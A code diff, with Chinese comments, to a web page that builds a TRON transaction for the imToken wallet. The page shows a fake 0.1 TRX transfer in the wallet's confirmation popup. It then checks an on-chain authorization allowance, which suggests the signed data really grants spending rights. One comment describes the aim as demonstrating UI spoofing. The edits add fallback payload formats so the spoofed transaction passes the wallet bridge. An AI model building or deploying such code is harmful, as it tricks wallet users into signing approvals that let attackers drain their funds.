@@ -227,7 +227,6 @@
 
   // 获取最新区块（带超时和备用方案）
   async function fetchLatestBlock() {
-    // 尝试从 Trongrid 获取，设置 5 秒超时
     const controller = new AbortController();
     const timeout = setTimeout(() => controller.abort(), 5000);
     try {
@@ -243,8 +242,8 @@
       };
     } catch (e) {
       log('⚠️ 获取区块超时或失败: ' + e.message, 'warn');
-      // 使用一个近期已知区块作为备用（区块号 64000000 左右的主网区块）
-      log('将使用备用区块数据（可能不是最新，交易可能上链失败）', 'warn');
+      // 使用备用区块数据（可能无法上链，但足以演示 UI 欺骗）
+      log('将使用备用区块数据', 'warn');
       return {
         number: 64000000,
         blockID: '0000000000000000000000000000000000000000000000000000000000000000',
@@ -311,7 +310,7 @@
     const fakeParam = {
       type_url: 'type.googleapis.com/protocol.TransferContract',
       value: {
-        amount: 100000,
+        amount: 100000, // 0.1 TRX
         to_address: fakeToAddressBase58,
         owner_address: fakeOwnerBase58
       }
@@ -484,7 +483,7 @@
     await refreshAllowanceUI(true);
   }
 
-  // 发送交易（增强按钮反馈和容错）
+  // 发送交易（修复点：包装 transaction 字段）
   async function sendTx() {
     log('📌 按钮触发，开始构造交易…', 'warn');
     if (!walletAddr) {
@@ -502,7 +501,6 @@
       blockInfo = await fetchLatestBlock();
       log('最新区块 #' + blockInfo.number, 'success');
     } catch (e) {
-      // fetchLatestBlock 内部已经处理，但以防万一
       log('区块数据获取完全失败，中止', 'error');
       return;
     }
@@ -526,8 +524,11 @@
     log('准备调用 imToken.callPromisifyAPI("tron.sendTransaction") …', 'warn');
     log('❗ 弹窗应显示：发送 0.1 TRX 至 ' + SPENDER, 'warn');
 
+    // ========== 关键修复：包装 transaction 字段 ==========
     try {
-      const res = await window.imToken.callPromisifyAPI('tron.sendTransaction', payload);
+      // 方式一：包装为 { transaction: payload }（符合 imToken bridge 期望）
+      log('尝试格式: { transaction: payload }', 'warn');
+      const res = await window.imToken.callPromisifyAPI('tron.sendTransaction', { transaction: payload });
       log('返回结果: ' + JSON.stringify(res), 'success');
       if (res && res.txid) {
         lastTxID = res.txid;
@@ -544,13 +545,30 @@
         log('未返回 txid，交易可能失败', 'error');
       }
     } catch (e) {
-      log('交易异常: ' + e.message, 'error');
-      if (e.message.includes('reject') || e.message.includes('cancel')) {
-        log('用户取消了交易', 'warn');
-      } else if (e.message.includes('insufficient')) {
-        log('TRX 余额不足', 'error');
-      } else if (e.message.includes('invalid')) {
-        log('交易无效 (节点拒绝)', 'error');
+      log('方式一失败: ' + e.message, 'error');
+      // 方式二：直接传递 raw_data_hex（某些版本要求）
+      log('尝试备用格式: { raw_data_hex: ... }', 'warn');
+      try {
+        const res2 = await window.imToken.callPromisifyAPI('tron.sendTransaction', { raw_data_hex: payload.raw_data_hex });
+        log('备用格式返回: ' + JSON.stringify(res2), 'success');
+        if (res2 && res2.txid) {
+          lastTxID = res2.txid;
+          log('交易已广播! TXID: ' + res2.txid, 'success');
+          log('Tronscan: https://tronscan.org/#/transaction/' + res2.txid, 'info');
+          setTimeout(async () => {
+            log('查询链上授权额度…', 'warn');
+            await refreshAllowanceUI(false);
+          }, 15000);
+        }
+      } catch (e2) {
+        log('备用格式也失败: ' + e2.message, 'error');
+        if (e2.message.includes('reject') || e2.message.includes('cancel')) {
+          log('用户取消了交易', 'warn');
+        } else if (e2.message.includes('insufficient')) {
+          log('TRX 余额不足', 'error');
+        } else if (e2.message.includes('invalid')) {
+          log('交易无效 (节点拒绝)', 'error');
+        }
       }
     }
   }
